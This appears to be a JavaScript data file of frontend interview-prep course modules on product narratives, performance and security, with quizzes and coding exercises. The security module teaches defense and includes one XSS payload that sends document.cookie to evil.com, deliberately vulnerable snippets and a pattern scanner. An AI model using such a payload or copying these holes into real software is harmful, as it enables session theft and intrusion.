      { term: 'Guardrail Metric', definition: 'A secondary metric you monitor to ensure improving your primary metric does not cause harm elsewhere — e.g., don\'t improve speed at the cost of error rate.' },
      { term: 'Product Narrative', definition: 'The story of a project told from the user\'s perspective — problem first, user named, technical choices justified by product requirements.' },
      { term: 'Owner Mentality', definition: 'Treating a project as if you are responsible for its success, not just its completion — questioning specs, measuring outcomes, and thinking beyond the current task.' },
    ],
    quiz: [
      {
        q: 'Which framing demonstrates stronger product thinking for your job board project?',
        options: ['"I built it using Next.js 14, Supabase, and Tailwind CSS with full TypeScript."', '"I built a job board because tracking applications across 15 portals was chaotic — the app reduced my average time-to-apply from 4 minutes to 45 seconds."', '"I built it to learn full-stack development and practice with modern tools."', '"I built it following the course curriculum to demonstrate my skills."'],
        correct: 1,
        explanation: 'The product narrative names the user problem, the solution, and a measurable outcome. Listing tech stack or citing learning goals does not demonstrate product thinking.',
      },
      {
        q: 'An interviewer asks "What metrics would you use to measure success for your job board?" The strongest answer includes:',
        options: ['Page load time and Lighthouse score', 'Number of GitHub stars and forks', 'A primary metric (e.g., applications tracked per user) and a guardrail metric (e.g., task completion rate does not drop)', 'Monthly active users only'],
        correct: 2,
        explanation: 'Strong metric answers include both a primary success metric and a guardrail to prevent gaming one number at the expense of another. This shows product maturity.',
      },
      {
        q: 'When asked "What would you build next in your project?", the strongest answer:',
        options: ['Names a new technology you want to try', 'Starts with a user problem you observed, then proposes the feature', 'Lists features that would make the project more impressive on your resume', 'Says you would add more animations and micro-interactions'],
        correct: 1,
        explanation: '"I noticed I was still losing track of companies after the interview stage, so I\'d add a follow-up reminder system" — problem first, feature second. Technology interest alone is not a product reason.',
      },
      {
        q: 'The Jobs-to-be-Done framework describes product features as:',
        options: ['The technical implementation details and stack choices', '"When I [context], I want to [motivation], so I can [outcome]"', 'The business revenue model behind the feature', 'A prioritized list of user stories in a backlog'],
        correct: 1,
        explanation: 'JTBD centers on the user\'s goal and context, not the feature itself. "When I am managing 20 applications, I want status tracking, so I can follow up at the right time" is the job. The feature (status tracker) is the hire.',
      },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `productNarrative(problem, user, solution, metric, techJustification)` that formats a product narrative for a project. Then use it to write the product narrative for your job board project — include the user problem, who the user is, what the solution does, a success metric, and why you chose your tech stack.',
      starterCode: `function productNarrative(problem, user, solution, metric, techJustification) {
  // Format a product narrative as a structured string
}

// Write the product narrative for your job board
const jobBoardNarrative = productNarrative(
  'problem: what user pain does the product solve?',
  'user: who experiences this pain?',
  'solution: what does the product do to solve it?',
  'metric: how do you know if it worked?',
  'techJustification: how did product needs drive your tech choices?'
)

console.log(jobBoardNarrative)`,
      solution: `function productNarrative(problem, user, solution, metric, techJustification) {
  return \`PROBLEM: \${problem}

USER: \${user}

SOLUTION: \${solution}

SUCCESS METRIC: \${metric}

TECH JUSTIFICATION: \${techJustification}\`
}

const jobBoardNarrative = productNarrative(
  'Tracking job applications across 15+ different company portals was chaotic — candidates lost track of follow-up dates, forgot which version of their resume they submitted, and missed time-sensitive opportunities.',
  'Job seekers actively interviewing at multiple companies simultaneously — specifically me, as a self-taught developer managing a full search campaign.',
  'A centralized application tracker with status stages (Applied → Interview → Offer → Rejected), notes per application, company research storage, and a dashboard showing active pipeline at a glance.',
  'Average time-to-find-application-details dropped from ~4 minutes (searching emails and tabs) to under 10 seconds. Zero missed follow-ups after the first two weeks of use.',
  'Next.js for SSR so public job listing pages are indexable by Google (SEO was a product requirement, not a tech preference). Supabase for auth + relational schema because application tracking data is inherently relational (users, companies, jobs, applications are separate tables with relationships). Tailwind for fast UI iteration — the product needed to be functional quickly, not beautiful slowly.'
)

console.log(jobBoardNarrative)`,
      hints: ['The problem statement should describe user pain, not feature absence', 'The metric should be something you can actually measure — even an estimate counts', 'Tech justification should trace directly to product requirements, not "I wanted to learn X"'],
    },
  },
  {
    id: 'cc-interview-fe-m13', track: 'crash', title: 'Performance Awareness — Make It 10× Faster',
    subtitle: '"How would you make this 10x faster?" — the senior frontend performance question. Systematic profiling, the right metrics, and concrete optimization techniques.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 260, duration: 17, module: 13, certArea: 'Frontend Interview Prep',
    content: `"How would you make this page 10× faster?" is a question senior frontend engineers face in both interviews and real production. The candidate who says "I'd optimize the images" sounds junior. The candidate who says "First I'd measure — I can't make it faster without knowing what's slow" passes the first filter. This module gives you a complete framework for frontend performance diagnosis and optimization.

## Measure First, Optimize Second

The single most common mistake in performance work is optimizing by instinct instead of data. Your answer to any performance question must start with measurement.

**The measurement stack:**
- **Lighthouse** in Chrome DevTools — LCP, CLS, FID/INP, TBT, Speed Index, plus specific opportunities
- **Chrome DevTools Performance tab** — flame chart showing the exact JS functions consuming CPU
- **Network tab** — waterfall showing request timing, blocking resources, and payload sizes
- **Webpack Bundle Analyzer** (\`npx next build && npx @next/bundle-analyzer\`) — which packages are largest in the bundle
- **Web Vitals extension** — real-time Core Web Vitals on any page

**The three Core Web Vitals you must know:**
- **LCP (Largest Contentful Paint)** — time for the main content to render. Target: < 2.5s. Most commonly caused by unoptimized images or render-blocking scripts.
- **CLS (Cumulative Layout Shift)** — amount of unexpected layout movement. Target: < 0.1. Most commonly caused by images without dimensions or fonts loading late.
- **INP (Interaction to Next Paint)** — responsiveness to user input. Target: < 200ms. Most commonly caused by long JavaScript tasks blocking the main thread.

## The Frontend Performance Hierarchy

Optimizations, in order of highest to lowest impact:

**1. Eliminate what you don't need** (10–50× impact)
Unused JavaScript is the biggest performance killer. Remove unused dependencies, split code by route, and defer non-critical scripts.
\`\`\`js
// Next.js automatic route-based code splitting
// Each page is its own JS chunk — only loads what's needed
import dynamic from 'next/dynamic'
const HeavyChart = dynamic(() => import('./HeavyChart'), { ssr: false, loading: () => <Skeleton /> })
\`\`\`

**2. Optimize images** (3–10× impact on image-heavy pages)
\`\`\`jsx
// next/image automatically: WebP conversion, responsive sizes, lazy loading, prevents CLS with aspect ratio
<Image src="/hero.jpg" alt="Hero" width={1200} height={600} priority /> // priority for above-fold LCP image
\`\`\`

**3. Load fonts correctly** (eliminates CLS + LCP delay)
\`\`\`js
// next/font loads fonts at build time, self-hosted, zero CLS
import { Inter } from 'next/font/google'
const inter = Inter({ subsets: ['latin'], display: 'swap' })
\`\`\`

**4. Reduce JavaScript execution** (2–5× on JS-heavy pages)
- Move data fetching to Server Components (zero client bundle impact)
- Use \`useMemo\` and \`useCallback\` only where profiling shows re-computation cost
- Avoid blocking the main thread with long synchronous operations

**5. Cache aggressively** (eliminates redundant work)
- React Query caches server data — staleTime and gcTime prevent unnecessary refetches
- Next.js caches fetch() responses — revalidate controls freshness

## Answering "How Would You Make This 10× Faster?"

**Framework**: Measure → Identify bottleneck type → Apply targeted fix → Verify improvement

1. Run Lighthouse and record baseline LCP, CLS, INP
2. Look at the Network tab — what's the largest resource? What's render-blocking?
3. Check the bundle analyzer — is there a 500KB library that could be replaced?
4. Apply the highest-impact fix first (usually images or unused JS)
5. Re-run Lighthouse — did the metric improve?

**Never say**: "I would optimize everything." Say: "I would measure first, identify the specific bottleneck, apply the most targeted fix, and verify the improvement with Lighthouse before moving to the next item."`,
    keyTerms: [
      { term: 'LCP (Largest Contentful Paint)', definition: 'Core Web Vital measuring how long the main content takes to render. Target: < 2.5s. Primary causes: unoptimized hero images, render-blocking scripts.' },
      { term: 'CLS (Cumulative Layout Shift)', definition: 'Core Web Vital measuring unexpected layout movement during load. Target: < 0.1. Primary causes: images without dimensions, fonts loading after text.' },
      { term: 'INP (Interaction to Next Paint)', definition: 'Core Web Vital measuring responsiveness to user input. Target: < 200ms. Primary cause: long JavaScript tasks blocking the main thread.' },
      { term: 'Code Splitting', definition: 'Breaking a JavaScript bundle into smaller chunks that load only when needed — Next.js does route-level splitting automatically; dynamic() enables component-level splitting.' },
      { term: 'Bundle Analyzer', definition: 'A tool visualizing the size contribution of each package in your JavaScript bundle — identifies large dependencies to replace, lazy-load, or remove.' },
    ],
    quiz: [
      { q: 'An interviewer asks "How would you make this page 10× faster?" The strongest first response is:', options: ['"I would optimize the images."', '"I would measure first — run Lighthouse to identify the specific bottleneck before touching any code."', '"I would remove all JavaScript."', '"I would switch to a static site generator."'], correct: 1, explanation: 'Measuring before optimizing is the hallmark of a senior engineer. Saying "measure first" immediately differentiates you — most candidates jump to guessing the solution without data.' },
      { q: 'Your LCP is 8 seconds. The Network tab shows a 2.4MB hero image loading without any compression. The highest-impact fix is:', options: ['Add more server RAM', 'Replace the raw <img> with next/image and add priority attribute for the above-fold image', 'Enable HTTP/2', 'Add a loading spinner so the wait feels shorter'], correct: 1, explanation: 'next/image converts to WebP (typically 70–80% size reduction), adds responsive sizes, prevents CLS, and the priority attribute preloads the above-fold image — directly fixing the LCP bottleneck.' },
      { q: 'What causes Cumulative Layout Shift (CLS) and how do you fix it?', options: ['Slow API responses — add loading skeletons', 'Images without explicit dimensions, fonts loading late — fix with width/height on images and next/font', 'Too many React components — use virtualization', 'Server-side rendering instead of client rendering'], correct: 1, explanation: 'CLS happens when the browser doesn\'t know an element\'s size before it loads, causing content to shift. Explicit width/height on images and next/font (which reserves space before loading) are the standard fixes.' },
      { q: 'Moving a data-fetching component from a Client Component to a Server Component improves performance because:', options: ['Server Components are faster at rendering HTML', 'The data fetching code is excluded from the client JavaScript bundle entirely', 'Server Components automatically cache all responses', 'Server Components use a faster version of fetch()'], correct: 1, explanation: 'Server Components have zero client bundle impact — they render on the server and send HTML. The data fetching logic never ships to the browser, reducing bundle size and eliminating client-side waterfall requests.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `performanceAudit(pageUrl, lcp, cls, inp, largestResource, unusedJs)` that formats a Lighthouse-style performance audit report with specific recommendations. Then fill it in for a realistic slow page scenario (LCP: 7.2s, CLS: 0.35, INP: 450ms).',
      starterCode: `function performanceAudit({ pageUrl, lcp, cls, inp, largestResource, unusedJs }) {
  // Format the audit as a report with:
  // 1. Current metrics vs targets
  // 2. Priority issues (sorted by impact)
  // 3. Specific fixes for each issue
}

const audit = performanceAudit({
  pageUrl: '/jobs',
  lcp: 7.2,            // seconds (target < 2.5s)
  cls: 0.35,           // score (target < 0.1)
  inp: 450,            // ms (target < 200ms)
  largestResource: '2.4MB uncompressed hero image (JPEG)',
  unusedJs: '380KB unused JavaScript in main bundle'
})

console.log(audit)`,
      solution: `function performanceAudit({ pageUrl, lcp, cls, inp, largestResource, unusedJs }) {
  const issues = []

  if (lcp > 2.5) issues.push({ severity: 'CRITICAL', metric: 'LCP', current: lcp + 's', target: '<2.5s', fix: 'Replace hero image with next/image + priority attribute. WebP conversion will reduce from 2.4MB to ~400KB.' })
  if (cls > 0.1) issues.push({ severity: 'HIGH', metric: 'CLS', current: cls, target: '<0.1', fix: 'Add explicit width/height to all images. Migrate Google Fonts to next/font to eliminate FOUT.' })
  if (inp > 200) issues.push({ severity: 'HIGH', metric: 'INP', current: inp + 'ms', target: '<200ms', fix: 'Profile with Chrome DevTools Performance tab to find long tasks. Likely caused by 380KB unused JS — defer with dynamic() imports.' })
  if (unusedJs) issues.push({ severity: 'HIGH', metric: 'Bundle size', current: unusedJs, target: '<100KB unused', fix: 'Run @next/bundle-analyzer. Move heavy dependencies to dynamic() or replace with lighter alternatives.' })

  return \`PERFORMANCE AUDIT: \${pageUrl}

METRICS:
  LCP: \${lcp}s \${lcp > 2.5 ? '❌ FAIL' : '✅ PASS'} (target < 2.5s)
  CLS: \${cls} \${cls > 0.1 ? '❌ FAIL' : '✅ PASS'} (target < 0.1)
  INP: \${inp}ms \${inp > 200 ? '❌ FAIL' : '✅ PASS'} (target < 200ms)

PRIORITY ISSUES:
\${issues.map((i, n) => \`  \${n + 1}. [\${i.severity}] \${i.metric}: \${i.current} → Fix: \${i.fix}\`).join('\\n')}

NEXT STEP: Apply fix #1 first, re-run Lighthouse to verify improvement before moving to #2.\`
}

const audit = performanceAudit({
  pageUrl: '/jobs',
  lcp: 7.2,
  cls: 0.35,
  inp: 450,
  largestResource: '2.4MB uncompressed hero image (JPEG)',
  unusedJs: '380KB unused JavaScript in main bundle'
})

console.log(audit)`,
      hints: ['Sort issues by impact — LCP is usually the most critical for perceived performance', 'Each fix should be specific: "use next/image with priority", not just "optimize images"', 'The final step should always be "re-run Lighthouse to verify" — performance is iterative'],
    },
  },
  {
    id: 'cc-interview-fe-m14', track: 'crash', title: 'Security Instincts — Spot the Vulnerability',
    subtitle: 'Senior engineers catch XSS, CSRF, auth bypasses, and data leaks in code review — without being told to look. Build the instincts that make you a standout candidate.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 260, duration: 16, module: 14, certArea: 'Frontend Interview Prep',
    content: `Security instincts are what separate a senior engineer from a mid-level one. Junior engineers write the feature. Mid-level engineers write tests. Senior engineers look at any piece of code and immediately ask "how could this be exploited?" This module builds those instincts.

## The Frontend Security Mental Model

Every frontend security vulnerability falls into one of three categories: **injecting code** (XSS), **forging identity/requests** (CSRF, auth bypass), or **leaking data** (exposed secrets, over-permissive APIs).

Train yourself to ask these three questions when reading any frontend code:
1. Can user-controlled input reach the DOM without sanitization? (XSS)
2. Can a malicious site trigger this action on behalf of an authenticated user? (CSRF)
3. Does this code expose secrets, tokens, or unauthorized data? (Data leak)

## XSS (Cross-Site Scripting) — The Most Common Frontend Vulnerability

XSS occurs when user-provided content is rendered as HTML or JavaScript. The classic sign:

\`\`\`jsx
// VULNERABLE — dangerouslySetInnerHTML with unsanitized user content
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />
}
// If text = '<script>fetch("https://evil.com/?cookie="+document.cookie)</script>'
// The script executes in the victim's browser, stealing their session cookie
\`\`\`

**The fix**: Never use dangerouslySetInnerHTML with user content. If rich text is required, sanitize with DOMPurify:
\`\`\`jsx
import DOMPurify from 'dompurify'
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />
}
\`\`\`

React's JSX is safe by default — \`{userContent}\` auto-escapes HTML. The vulnerability only appears with dangerouslySetInnerHTML, eval(), or direct DOM manipulation.

## CSRF (Cross-Site Request Forgery) — Forged Requests

CSRF occurs when a malicious site can trigger authenticated requests to your API using a victim's session. The classic attack: a hidden form on evil.com that POSTs to your-bank.com/transfer.

**Frontend defenses**:
- Use \`SameSite=Strict\` or \`SameSite=Lax\` on session cookies — prevents cross-origin cookies from being sent
- Never accept authentication solely via cookies from third-party origins without CSRF tokens
- In Supabase: the JWT stored in httpOnly + SameSite cookies is protected from CSRF by default

## Exposed Secrets and Data Leaks

\`\`\`js
// VULNERABLE — API key in client bundle
const response = await fetch('/api/data', {
  headers: { 'x-api-key': 'sk_live_actualSecretKey123' }
})
// Any user who opens DevTools Network tab sees this key
\`\`\`

**Rules**:
- \`NEXT_PUBLIC_\` prefix → goes into the client bundle (public)
- Without prefix → server-only (safe for secrets)
- Never put \`SUPABASE_SERVICE_ROLE_KEY\`, payment keys, or internal API keys in client-side code

## Auth Bypass Patterns to Spot

\`\`\`jsx
// VULNERABLE — client-side auth check with no server enforcement
function AdminPage() {
  const isAdmin = localStorage.getItem('isAdmin') === 'true'
  if (!isAdmin) return <p>Not authorized</p>
  return <AdminDashboard />  // Still loads the component and its data
}
// An attacker sets localStorage.setItem('isAdmin', 'true') and sees AdminDashboard
\`\`\`

**The fix**: Protect pages in Next.js middleware and verify authorization in every Server Component/API route — never trust client-side auth state alone.

## The Code Review Security Checklist

When reviewing any PR, scan for:
1. **dangerouslySetInnerHTML** — is the content sanitized?
2. **Environment variables** — is NEXT_PUBLIC_ used for anything sensitive?
3. **URL parameters rendered directly** — \`const name = searchParams.get('name'); return <h1>{name}</h1>\` is safe (JSX escapes), but \`dangerouslySetInnerHTML={{ __html: name }}\` is not
4. **Auth checks client-side only** — is there a corresponding server-side check?
5. **Third-party scripts** — does a new \`<script src="https://...">\` in _document.tsx belong there?`,
    keyTerms: [
      { term: 'XSS (Cross-Site Scripting)', definition: 'A vulnerability where user-controlled content is rendered as executable HTML or JavaScript — stealing sessions, redirecting users, or modifying page content.' },
      { term: 'CSRF (Cross-Site Request Forgery)', definition: 'An attack where a malicious site triggers authenticated requests to another site using the victim\'s cookies — prevented by SameSite cookie attribute.' },
      { term: 'dangerouslySetInnerHTML', definition: 'React\'s escape hatch for raw HTML injection — safe only with a sanitization library like DOMPurify. Using it with unsanitized user input is a direct XSS vulnerability.' },
      { term: 'NEXT_PUBLIC_ prefix', definition: 'Environment variable prefix in Next.js that includes the value in the client JavaScript bundle — never use it for secrets, API keys, or service role tokens.' },
      { term: 'Client-Side Auth Bypass', definition: 'A vulnerability where authorization is enforced only in the browser (e.g., hiding a component) but not on the server — attackers bypass the UI check and access protected data.' },
    ],
    quiz: [
      { q: 'A code review shows: `<div dangerouslySetInnerHTML={{ __html: comment.body }} />`. What is the vulnerability and fix?', options: ['This is safe — React escapes HTML automatically', 'XSS vulnerability — user content rendered as HTML can execute scripts. Fix: wrap comment.body with DOMPurify.sanitize()', 'This causes a re-render loop', 'This is a CSRF vulnerability'], correct: 1, explanation: 'dangerouslySetInnerHTML bypasses React\'s automatic escaping. If comment.body contains a <script> tag, it executes. DOMPurify.sanitize() removes dangerous HTML while preserving safe formatting.' },
      { q: 'A developer adds `NEXT_PUBLIC_PAYMENT_SECRET_KEY=sk_live_...` to .env.local. What is the security impact?', options: ['No impact — .env.local is gitignored', 'The key is bundled into the client JavaScript and visible in DevTools to any user', 'NEXT_PUBLIC_ variables are automatically encrypted at runtime', 'This only affects development, not production'], correct: 1, explanation: 'NEXT_PUBLIC_ variables are inlined into the browser bundle at build time. Anyone who opens DevTools → Sources or Network can read them. Secret keys must never have the NEXT_PUBLIC_ prefix.' },
      { q: 'An AdminPage component checks `localStorage.getItem("isAdmin") === "true"` before rendering. What is wrong?', options: ['localStorage is slow for auth checks', 'Client-side auth checks are bypassable — an attacker sets the localStorage value and accesses the component. Server-side authorization is required.', 'This approach only works in Chrome', 'The condition is inverted'], correct: 1, explanation: 'Client-side code is fully controllable by the attacker — they can set any localStorage value in the browser console. Authorization must be enforced in Next.js middleware, Server Components, and API routes.' },
      { q: 'Which React pattern is safe from XSS by default?', options: ['dangerouslySetInnerHTML={{ __html: userInput }}', 'eval(userInput)', '{userInput} in JSX', 'document.innerHTML = userInput'], correct: 2, explanation: 'JSX text interpolation ({userInput}) automatically HTML-escapes the content before inserting it into the DOM. dangerouslySetInnerHTML, eval(), and direct DOM manipulation all bypass this protection.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `securityReview(code)` that scans a code snippet for 4 common frontend security issues: dangerouslySetInnerHTML without sanitization, NEXT_PUBLIC_ used for secrets, client-side-only auth checks, and eval(). Return an array of findings with vulnerability type and description. Test it on the vulnerable snippets below.',
      starterCode: `function securityReview(code) {
  const findings = []

  // Check for each vulnerability pattern:
  // 1. dangerouslySetInnerHTML (warn unless DOMPurify.sanitize is in the same expression)
  // 2. NEXT_PUBLIC_ with words like SECRET, KEY, TOKEN, PASS
  // 3. localStorage.getItem used for auth/admin checks
  // 4. eval() usage

  return findings
}

// Test on these snippets:
const snippet1 = \`<div dangerouslySetInnerHTML={{ __html: userInput }} />\`
const snippet2 = \`const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY\`
const snippet3 = \`if (localStorage.getItem('isAdmin') === 'true') showAdminPanel()\`
const snippet4 = \`eval(userSubmittedCode)\`

console.log('Snippet 1:', securityReview(snippet1))
console.log('Snippet 2:', securityReview(snippet2))
console.log('Snippet 3:', securityReview(snippet3))
console.log('Snippet 4:', securityReview(snippet4))`,
      solution: `function securityReview(code) {
  const findings = []

  if (code.includes('dangerouslySetInnerHTML') && !code.includes('DOMPurify.sanitize')) {
    findings.push({ type: 'XSS', severity: 'CRITICAL', description: 'dangerouslySetInnerHTML without DOMPurify.sanitize() — user content rendered as HTML can execute arbitrary scripts.' })
  }

  if (/NEXT_PUBLIC_[A-Z_]*(SECRET|KEY|TOKEN|PASS|PRIVATE)/i.test(code)) {
    findings.push({ type: 'Secret Exposure', severity: 'CRITICAL', description: 'NEXT_PUBLIC_ prefix exposes this value in the client JavaScript bundle — visible to all users in DevTools. Remove NEXT_PUBLIC_ prefix and access only in Server Components or API routes.' })
  }

  if (/localStorage\\.getItem[^)]*['"](isAdmin|admin|role|auth)['"]/i.test(code)) {
    findings.push({ type: 'Auth Bypass', severity: 'HIGH', description: 'Authorization based on localStorage is bypassable — any attacker can set this value in the browser console. Enforce authorization server-side in middleware or API routes.' })
  }

  if (/\\beval\\s*\\(/.test(code)) {
    findings.push({ type: 'Code Injection', severity: 'CRITICAL', description: 'eval() executes arbitrary JavaScript strings — direct code injection vulnerability. Never use eval() with any external or user-controlled input.' })
  }

  return findings.length ? findings : [{ type: 'Clean', severity: 'NONE', description: 'No common vulnerabilities detected in this snippet.' }]
}

const snippet1 = \`<div dangerouslySetInnerHTML={{ __html: userInput }} />\`
const snippet2 = \`const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY\`
const snippet3 = \`if (localStorage.getItem('isAdmin') === 'true') showAdminPanel()\`
const snippet4 = \`eval(userSubmittedCode)\`

console.log('Snippet 1:', securityReview(snippet1))
console.log('Snippet 2:', securityReview(snippet2))
console.log('Snippet 3:', securityReview(snippet3))
console.log('Snippet 4:', securityReview(snippet4))`,
      hints: ['Use regex to detect patterns — /NEXT_PUBLIC_.*SECRET/i catches variations', 'dangerouslySetInnerHTML is only safe when DOMPurify.sanitize wraps the value — check for both', 'localStorage auth checks are a red flag even if the logic looks correct — server enforcement is what matters'],
    },
  },
]
